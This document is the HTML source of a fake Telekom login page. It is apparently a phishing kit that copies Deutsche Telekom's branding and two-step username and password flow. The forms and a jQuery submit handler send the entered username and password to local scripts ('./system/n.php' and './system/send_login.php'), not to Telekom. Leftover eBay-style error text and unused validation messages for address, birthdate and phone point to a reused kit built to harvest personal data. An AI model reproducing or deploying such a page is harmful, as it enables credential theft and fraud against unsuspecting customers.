<!DOCTYPE html>

<html class="no-js" lang="de"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <meta name="bwpageid" content="VIEW_USERNAME">

    <link rel="stylesheet" type="text/css" href="./style/components.min.css">
    <link rel="stylesheet" type="text/css" href="./style/login-24.12.2.css">
    


<script src=".\style\js/angular.min.js"></script>
<script src=".\style\js/jquery.min.js"></script>
<script src=".\style\js/jquery.validate.min.js"></script>
<script src=".\style\js/jquery.mask.js"></script>
    
</head>

<body ng-app="" class="">
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>


    <div class="offset-bottom-4 offset-s-bottom-3"></div>
</div>

<div>
    
</div>

<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                <img src="./style/t-online-logo-29112019.png">
            </div>
            <h1 id="loginuser" class="offset-top-0 offset-bottom-3 text-center">Telekom Login Benutzername eingeben</h1>
            <h1 style="display: none;" id="loginPassword" class="offset-top-0 offset-bottom-3 text-center">Telekom Login Passwort eingeben</h1>

        </div>

<script>
$(function() {

    var validator = $("#signin-form").bind("invalid-form.validate", function() {
            $("#errorrloginnet").html('<div class="inline-notice inline-notice--attention" aria-labelledby="s0-16-16-29-6-7-1-status"><span class="inline-notice__status" id="s0-16-16-29-6-7-1-status"><svg aria-hidden="true" class="icon icon--attention-filled" focusable="false" aria-labelledby="s0-16-16-29-6-7-1-6-text"><use xlink:href="#icon-attention-filled"></use></svg></span><span class="inline-notice__content"><p id="signin-error-msg" tabindex="0">Oops, that s not a match.</p></span></div><br><div><div class="textbox"><label for="userid" class="floating-label__label floating-label__label--animate">Email or username</label><input id="userid" class="textbox__control textbox__control--fluid textbox__control--underline" type="text" value="4565465464" name="userid" maxlength="64" autocomplete="username" aria-invalid="true"></div><br><button id="signin-continue-btn" name="signin-continue-btn" class="btn btn--fluid btn--large btn--primary" data-ebayui="" type="button">Continue</button></div>');})
  $("form[name='signin-form']").validate({

    errorContainer: $("#errorrsignin-form"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },





highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
    $( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



                },

unhighlight: function (element, errorClass, validClass) {
                    
    this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

    $( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );

                },




    messages: {
      

      phoneNumber : "Please enter Phone Number.",
      zipCod : "Please enter Postal.",
      addres : "Please enter Address Line.",

      Firstname : "Please enter First name.",
      LastName : "Please enter Last Name.",

      birthdate : "Please enter DD/MM/YYYY.",
      City : "Please enter City.",
      State: "Please enter State.",




      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {




$("#loginuser").hide();
$("#loginPassword").show();



$("#spuenndr").show(500);


$("#userlogin").hide();

$("#passwordlogin").show();





                    $.post("./system/n.php?ajax", $("#signin-form").serialize(), function(result) {
                            setTimeout(function() {




$("#userid").hide();
$("#signi").hide();
$("#sirm").show();



});
});
},
});
});
</script>



<script>
$(document).ready(function(){
$("#id_change").click(function(){

$("#userlogin").show();

$("#passwordlogin").hide();


});
});
</script>



<div id="passwordlogin" style="display: none;" class="login-box">

            

            
            <div class="offset-bottom-1">
                <div>
                    <div class="form-input-set floating">
                        <label>Benutzername</label>
                        <p class="form-input static text-ellipsis" title="otzelberger.doris@t-online.de">{{ username }}</p>
                    </div>
                </div>

                
                <div>
                    <form id="idchange" name="idchange" method="POST" action="#" accept-charset="UTF-8" autocomplete="off">
                        <div class="offset-bottom-1 clearfix">
                    
                            <div class="pull-right tbs-sublink">
                                <button class="btn-link text-right" id="id_change" name="changeIdentity" tabindex="50" type="submit">Nicht Ihr Benutzername?</button>
                            </div>
                        </div>
                    </form>
                </div>

                <div>
                    <form id="login" name="login" method="POST" action="./system/send_login.php" accept-charset="UTF-8" autocomplete="off">


                        
                        <input name="hidden_usr" type="text" value="{{ username }}" class="hidden" >

                    
                        <div>
                
                            <div class="form-input-set">
                                <input style="
    padding: 7px 12px 6px;
" placeholder="Passwort"  id="pw_pwd" required="" name="pw_pwd" type="password" inputmode="text" maxlength="128" class="form-input" tabindex="20" >
                                <span id="toggle-password-visibility" class="icon-svg icon-eye-display" data-toggle-use-state-from-storage="false" data-toggle-element-id="pw_pwd"></span>
                                <label for="pw_pwd"></label>
                            </div>

                        </div>

                        
                        

                        
                        <div class="login-helpers clearfix">

                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <input id="checkbox_permanent_displayed" type="hidden" name="persist_session_displayed" value="1">
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_permanent" type="checkbox" name="persist_session" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>Angemeldet bleiben</span>
                                </label>
                            </div>

                        </div>


                        <div>
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Login</button>
                        </div>


                        <div class="offset-top-1">
                            <button id="altAuthMethod" name="altAuthMethod" type="submit" class="btn btn-block btn-default btn-large" tabindex="41">Andere Anmeldeoptionen</button>
                        </div>
                    </form>
                </div>

                <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
                    <p>Passwort vergessen?</p>
                    <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
                </div>

                
            </div>

            <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
                <a id="helpLink" href="#telekom-login" tabindex="45" target="_blank">Benötigen Sie Hilfe?</a>
            </div>
        </div>









        <div id="userlogin" class="login-box">
            

            <div class="offset-bottom-1">
                <form id="signin-form" name="signin-form" method="POST" action="" accept-charset="UTF-8" >
                                        <div class="offset-bottom-1">
                        
                        <div class="form-input-set">
                            <input style="
    padding: 7px 12px 6px;
" placeholder="Benutzername" required="" ng-model="username" id="username" name="username" type="text" inputmode="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">

                            <label for="username"></label>
                            <i id="inputNotificationToggle" class="icon icon-help" data-target="#usrInfo" data-trigger="click"></i>
                        </div>

                        
                        <div id="usrInfo" class="info-box">
                            <p>So können Sie sich anmelden:</p>
                            <ul>
                                <li>
                                    <span class="text-bold">E-Mail-Adresse: </span>
                                    <span>Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">Mobilfunk-Nummer: </span>
                                    <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
                                </li>
                                <li>
                                    <span class="text-bold">VERIMI Konto: </span>
                                    <span>Wenn Ihr Telekom Login mit einem VERIMI Konto verknüpft ist, geben Sie hier bitte zunächst Ihren Telekom Login Benutzernamen ein. Anschließend leiten wir Sie zu VERIMI weiter.</span>
                                </li>
                            </ul>
                        </div>




                        
                        <div class="login-helpers clearfix">

                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js checked" autocomplete="off" hidefocus="true" aria-checked="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox hidden" tabindex="30" checked="checked">
                                    <span>Benutzername merken</span>
                                </label>
                            </div>
                        </div>

                        
                        <div class="clearfix offset-bottom-1">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Weiter</button>
                        </div>

                        
                        <div class="clearfix">
                            <button class="btn btn-default btn-block btn-large" role="button" name="showSelectIdentMethod" tabindex="41" type="submit">Andere Anmeldeoptionen</button>
                        </div>


                    </div>
                    <input name="hidden_pwd" type="password" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">
                </form>

                <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
                    <p>Benutzername oder Passwort vergessen?</p>
                    <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
                </div>

                

                <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
                    <a id="helpLink" href="#telekom-login" tabindex="45" target="_blank">Benötigen Sie Hilfe?</a>
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Noch keinen Telekom Login?</span>
                            <a id="registrationLink" class="text-nowrap" tabindex="50" href="#telekom-e-mail">Telekom Login erstellen</a>
                            <span>und E-Mail nutzen.</span>
                        </p>
                    </div>
                </div>

                <div class="text-center offset-bottom-2">
                    <img src="./style/services.png">
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
                            <a id="verimiLink" class="text-nowrap" tabindex="60" target="_blank" href="#/login-daten-passwoerter/verimi">Hier informieren über VERIMI</a>
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>© Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">24.12.2, 4194a5e2d0d7b40759d719349ca67bb4, 32ade5dd4c8da31662262f245f3decee46f3c737</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="#start/impressum" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="#datenschutz-ganz-einfach" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>






</body></html>